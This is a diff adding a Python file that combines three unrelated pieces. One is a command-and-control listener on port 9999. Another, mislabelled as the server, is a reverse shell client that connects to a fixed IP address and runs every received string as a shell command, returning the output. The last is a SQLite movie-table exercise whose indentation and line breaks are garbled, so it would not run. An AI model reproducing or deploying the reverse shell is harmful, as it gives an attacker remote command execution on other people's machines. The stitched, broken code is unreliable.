@@ -1,0 +1,96 @@
+import socket
+import sys
+def create_socket():
+    try:
+        global host
+        global port
+        global s
+        host = ""
+        port = 9999
+        s = socket.socket()
+
+    except socket.error as msg:
+        print("socket creation error" + str(msg))
+def bind_socket():
+    try:
+        global host
+        global port
+        global s
+
+        print("Binding the port " + str(port))
+        s.bind((host, port))
+        s.listen(5)
+
+    except socket.error as msg:
+        print("socket finding error" + str(msg) + "Retrying")
+        bind_socket()
+def socket_accept():
+    conn, address = s.accept()
+    print("connection as been established! | " "IP " + address[0] + " port | " + str(address[1]))
+    send_command(conn)
+    conn.close()
+def send_command(conn):
+    while True:  
+        cmd = input()   # taking commands as input
+        if cmd == "quit":   #if command is quit first
+            conn.close()    #close the connection
+            s.close()       #close the socket
+            sys.exit()      #close the terminal prompt
+        if len(str.encode(cmd)) > 0:#if the length of the enocoded comand is greater than zero that means something is their in command
+            conn.send(str.encode(cmd))  #send the command to client
+            client_response = str(conn.recv(1024), "utf-8")   #storing the response in a variable
+            print(client_response, end="")    #to end the the command and for next command
+def main():
+    create_socket()
+    bind_socket()
+    socket_accept()
+main()
+
+#****server***
+import socket
+import os
+import subprocess
+s = socket.socket()
+host = '172.20.10.13'
+port = 9999
+s.connect((host, port))
+while True:
+    data = s.recv(1024)
+    if data[:2].decode("utf-8") == 'cd':
+        os.chdir(data[3:].decode("utf-8"))
+   if len(data) > 0:
+        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        output_byte = cmd.stdout.read() + cmd.stderr.read()
+        output_str = str(output_byte,"utf-8")
+        currentWD = os.getcwd() + "> "
+        s.send(str.encode(output_str + currentWD))
+
+        print(output_str)
+        
+        
+
+ #sql
+ import sqlite3
+db=sqlite3.connect('mydatabase.db')
+curs=db.cursor()
+curs.execute("""CREATE TABLE IF NOT EXISTS Movie (
+Movie_ID VARCHAR(255), Movie_Name VARCHAR(255),
+Genre VARCHAR(255), Language VARCHAR(255), Rating FLOAT);""")
+curs.execute("""INSERT INTO Movie VALUES ("101","No time to die","Mystery","English","8");""") curs.execute("""INSERT INTO Movie VALUES ("102","POTC","Adventure","English","9");""") curs.execute("""INSERT INTO Movie VALUES ("103","Jurassic Park","Thriller","English","9.2");""") curs.execute("""INSERT INTO Movie VALUES ("107","Mission Impossible","Thriller","English","7.5");""") curs.execute("""INSERT INTO Movie VALUES ("002","The Flopped","drama","English","2.5");""") print("Original data")
+curs.execute("SELECT * FROM Movie") res=curs.fetchall()
+for i in res:
+print(i) print("")
+curs.execute("""UPDATE Movie SET Rating = ((Rating*110)/100);""") print("Printing data after updating rating to 10%") curs.execute("SELECT * FROM Movie")
+res=curs.fetchall()
+for i in res: print(i)
+print("")
+curs.execute("""DELETE from Movie where Movie_ID = 102 """) print("Displaying data after deleting 102 Movie_ID") curs.execute("SELECT * FROM Movie")
+res=curs.fetchall()
+for i in res:
+print(i) print("")
+print("Displaying data having rating value greater than 3") curs.execute("SELECT * FROM Movie WHERE Rating>3")
+
+res=curs.fetchall() for i in res:
+print(i) print("")
+db.commit() db.close()
+        
